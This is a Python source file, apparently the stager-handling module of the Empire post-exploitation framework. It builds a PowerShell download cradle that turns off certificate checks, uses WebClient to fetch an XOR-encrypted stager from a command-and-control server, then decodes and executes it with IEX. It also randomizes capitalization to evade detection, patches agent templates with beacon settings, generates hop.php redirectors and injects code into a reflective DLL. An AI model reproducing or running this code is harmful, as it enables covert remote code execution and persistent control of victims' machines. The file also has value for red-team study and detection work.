"""

Stager handling functionality for Empire.

"""

import fnmatch
import imp
import http
import helpers
import encryption
import os
import base64


class Stagers:

    def __init__(self, MainMenu, args):

        self.mainMenu = MainMenu

        # pull the database connection object out of the main menu
        self.conn = self.mainMenu.conn

        self.args = args

        # stager module format:
        #     [ ("stager_name", instance) ]
        self.stagers = {}

        # pull out the code install path from the database config
        cur = self.conn.cursor()
        
        cur.execute("SELECT install_path FROM config")
        self.installPath = cur.fetchone()[0]

        cur.execute("SELECT default_profile FROM config")
        self.userAgent = (cur.fetchone()[0]).split("|")[1]

        cur.close()

        # pull out staging information from the main menu
        self.stage0 = self.mainMenu.stage0
        self.stage1 = self.mainMenu.stage1
        self.stage2 = self.mainMenu.stage2

        self.load_stagers()


    def load_stagers(self):
        """
        Load stagers from the install + "/lib/stagers/*" path
        """
        
        rootPath = self.installPath + 'lib'+os.sep+'stagers'+os.sep
        pattern = '*.py'
         
        for root, dirs, files in os.walk(rootPath):
            for filename in fnmatch.filter(files, pattern):
                filePath = os.path.join(root, filename)
                
                # extract just the module name from the full path
                stagerName = filePath.split(os.sep+"lib"+os.sep+"stagers"+os.sep)[-1][0:-3]

                # instantiate the module and save it to the internal cache
                self.stagers[stagerName] = imp.load_source(stagerName, filePath).Stager(self.mainMenu, [])


    def set_stager_option(self, option, value):
        """
        Sets an option for all stagers.
        """

        for name, stager in self.stagers.iteritems():
            for stagerOption,stagerValue in stager.options.iteritems():
                if stagerOption == option:
                    stager.options[option]['Value'] = str(value)


    def generate_stager(self, server, key, encrypt=True, encode=False):
        """
        Generate the PowerShell stager that will perform
        key negotiation with the server and kick off the agent.

        TODO: variable name replacement to change up transport size
                ... other PowerShell obfuscation techniques?
                    http://desktoplibrary.livelink-experts.com/obfuscate-powershell-user-manual ?
        """

        # read in the stager base
        f = open(self.installPath + "/data/agent/stager.ps1".replace('/', os.sep))
        stager = f.read()
        f.close()

        # make sure the server ends with "/"
        if not server.endswith(os.sep): server += "/"

        # patch the server and key information
        stager = stager.replace("REPLACE_SERVER", server)
        stager = stager.replace("REPLACE_STAGING_KEY", key)
        stager = stager.replace("index.jsp", self.stage1)
        stager = stager.replace("index.php", self.stage2)

        randomizedStager = ""

        for line in stager.split("\n"):
            line = line.strip()
            # skip commented line
            if not line.startswith("#"):
                # randomize capitalization of lines without quoted strings
                if "\"" not in line:
                    randomizedStager += helpers.randomize_capitalization(line)
                else:
                    randomizedStager += line

        # base64 encode the stager and return it
        if encode:
            return helpers.enc_powershell(randomizedStager)
        elif encrypt:
            # return an encrypted version of the stager ("normal" staging)
            return encryption.xor_encrypt(randomizedStager, key)
        else:
            # otherwise return the case-randomized stager
            return randomizedStager


    def generate_stager_hop(self, server, key, encrypt=True, encode=True):
        """
        Generate the PowerShell stager for hop.php redirectors that 
        will perform key negotiation with the server and kick off the agent.
        """

        # read in the stager base
        f = open(self.installPath + "./data/agent/stager_hop.ps1")
        stager = f.read()
        f.close()

        # patch the server and key information
        stager = stager.replace("REPLACE_SERVER", server)
        stager = stager.replace("REPLACE_STAGING_KEY", key)
        stager = stager.replace("index.jsp", self.stage1)
        stager = stager.replace("index.php", self.stage2)

        randomizedStager = ""

        for line in stager.split("\n"):
            line = line.strip()
            # skip commented line
            if not line.startswith("#"):
                # randomize capitalization of lines without quoted strings
                if "\"" not in line:
                    randomizedStager += helpers.randomize_capitalization(line)
                else:
                    randomizedStager += line
        
        # base64 encode the stager and return it
        if encode:
            return helpers.enc_powershell(randomizedStager)
        elif encrypt:
            # return an encrypted version of the stager ("normal" staging)
            return encryption.xor_encrypt(randomizedStager, key)
        else:
            # otherwise return the case-randomized stager
            return randomizedStager


    def generate_agent(self, delay, jitter, profile, killDate, workingHours, lostLimit):
        """
        Generate "standard API" functionality, i.e. the actual agent.ps1 that runs.
        
        This should always be sent over encrypted comms.
        """

        f = open(self.installPath + "./data/agent/agent.ps1".replace('/', os.sep))
        code = f.read()
        f.close()

        # strip out comments and blank lines
        code = helpers.strip_powershell_comments(code)
        b64DefaultPage = base64.b64encode(http.default_page())

        # patch in the delay, jitter, lost limit, and comms profile
        code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
        code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
        code = code.replace('$Profile = "/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
        code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
        code = code.replace('$DefaultPage = ""', '$DefaultPage = "'+b64DefaultPage+'"')

        # patch in the killDate and workingHours if they're specified
        if killDate != "":
            code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
        if workingHours != "":
            code = code.replace('$WorkingHours,', "$WorkingHours = '" + str(workingHours) + "',")

        return code


    # def generate_agent(self, sessionID):
    #     """
    #     Generate the agent code for a particulare sessionID.
        
    #     Used for on-disk persistence without needing staging.
    #     Note: only use on reboot persistence, otherwise you'll get two agents running :)
    #     """

    #     if not self.mainMenu.agents.is_agent_present(sessionID):
    #         print helpers.color("[!] Invalid sessionID specified for agent generation.")
    #         return ""


    #     f = open(self.installPath + "./data/agent/agent.ps1")
    #     code = f.read()
    #     f.close()

    #     # strip out comments and blank lines
    #     code = helpers.strip_powershell_comments(code)

    #     # get the real sessionID based on the ID/name
    #     agentSessionID = self.mainMenu.agents.get_agent_id(sessionID)

    #     # get all agent information
    #     agentInfo = self.mainMenu.agents.get_agent(agentSessionID)

    #     # get (delay, jitter, profile, killDate, workingHours)
    #     sessionID = agentInfo[1]
    #     listener = agentInfo[2]
    #     delay = agentInfo[4]
    #     jitter = agentInfo[5]
    #     sessionKey = agentInfo[14]
    #     servers = agentInfo[19]
    #     uris = agentInfo[20]
    #     ua = agentInfo[22]
    #     headers = agentInfo[23]
    #     killDate = agentInfo[25]
    #     workingHours = agentInfo[26]

    #     profile = uris + "|" + ua

    #     if not headers == "":
    #         profile += "|" + headers

    #     # patch in the delay, jitter, and comms profile, etc.
    #     code = code.replace('$SessionID,', "$SessionID = \"%s\"," %(sessionID))
    #     code = code.replace('$SessionKey,', "$SessionKey = \"%s\"," %(sessionKey))
    #     code = code.replace('$Servers,', "$Servers = \"@('%s')\"," %(listener))
    #     code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
    #     code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
    #     code = code.replace('$Profile = "/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")

    #     # patch in the killDate and workingHours if they're specified
    #     if killDate != "":
    #         code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
    #     if workingHours != "":
    #         code = code.replace('$WorkingHours,', "$WorkingHours = '" + str(workingHours) + "',")

    #     return code


    def generate_launcher_uri(self, server, encode=True, pivotServer="", hop=False):
        """
        Generate a base launcher URI.

        This is used in the management/psinject module.
        """

        if hop:
            # generate the base64 encoded information for the hop translation
            checksum = "?" + helpers.encode_base64(server + "&" + self.stage0)
        else:
            # get a valid staging checksum uri
            checksum = self.stage0

        if pivotServer != "":
            checksum += "?" + helpers.encode_base64(pivotServer)

        if server.count("/") == 2 and not server.endswith("/"):
            server += "/"

        return server + checksum


    def generate_launcher(self, listenerName, encode=True, userAgent="default", proxy="default", proxyCreds="default"):
        """
        Generate the initial IEX download cradle with a specified
        c2 server and a valid HTTP checksum.

        listenerName -> a name of a validly registered listener

        userAgent ->    "default" uses the UA from the default profile in the database
                        "none" sets no user agent
                        any other text is used as the user-agent
        proxy ->        "default" uses the default system proxy 
                        "none" sets no proxy
                        any other text is used as the proxy

        """

        # if we don't have a valid listener, return nothing
        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            print helpers.color("[!] Invalid listener: " + listenerName)
            return ""

        # extract the staging information from this specified listener
        (server, stagingKey, pivotServer, hop) = self.mainMenu.listeners.get_stager_config(listenerName)

        # if UA is 'default', use the UA from the default profile in the database
        if userAgent.lower() == "default":
            userAgent = self.userAgent

        # get the launching URI
        URI = self.generate_launcher_uri(server, encode, pivotServer, hop)

        stager = helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")
        stager += "$u='"+userAgent+"';"

        if "https" in URI:
            # allow for self-signed certificates for https connections
            stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
        
        if userAgent.lower() != "none" or proxy.lower() != "none":
            
            if userAgent.lower() != "none":
                stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                stager += "'User-Agent',$u);"

            if proxy.lower() != "none":
                if proxy.lower() == "default":
                    stager += helpers.randomize_capitalization("$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;")
                else:
                    # TODO: implement form for other proxy
                    pass
                if proxyCreds.lower() == "default":
                    stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                else:
                    # TODO: implement form for other proxy credentials
                    pass 

        # the stub to decode the encrypted stager download by XOR'ing with the staging key
        stager += helpers.randomize_capitalization("$K=")
        stager += "'"+stagingKey+"';"
        stager += helpers.randomize_capitalization("$i=0;[char[]]$b=([char[]]($wc.DownloadString(\"")
        stager += URI
        stager += helpers.randomize_capitalization("\")))|%{$_-bXor$k[$i++%$k.Length]};IEX ($b-join'')")

        # base64 encode the stager and return it
        if encode:
            return helpers.powershell_launcher(stager)
        else:
            # otherwise return the case-randomized stager
            return stager


    def generate_hop_php(self, server, resources):
        """
        Generates a hop.php file with the specified target server 
        and resource URIs.
        """

        # read in the hop.php base
        f = open(self.installPath + "/data/misc/hop.php")
        hop = f.read()
        f.close()

        # make sure the server ends with "/"
        if not server.endswith("/"): server += "/"

        # patch in the server and resources
        hop = hop.replace("REPLACE_SERVER", server)
        hop = hop.replace("REPLACE_RESOURCES", resources)

        return hop


    def generate_dll(self, poshCode, arch):
        """
        Generate a PowerPick Reflective DLL to inject with base64-encoded
        stager code.
        """

        #read in original DLL and patch the bytes based on arch
        if arch.lower() == "x86":  
            origPath = self.installPath + "/data/misc/ReflectivePick_x86_orig.dll"
        else:
            origPath = self.installPath + "/data/misc/ReflectivePick_x64_orig.dll"

        if os.path.isfile(origPath):
            
            dllRaw = ''
            with open(origPath, 'rb') as f:
                dllRaw = f.read()

                replacementCode = helpers.decode_base64(poshCode)

                # patch the dll with the new PowerShell code
                searchString = (("Invoke-Replace").encode("UTF-16"))[2:]
                index = dllRaw.find(searchString)
                print "index:",index
                dllPatched = dllRaw[:index]+replacementCode+dllRaw[(index+len(replacementCode)):]

                return dllPatched

        else:
            print helpers.color("[!] Original .dll for arch "+arch+" does not exist!")


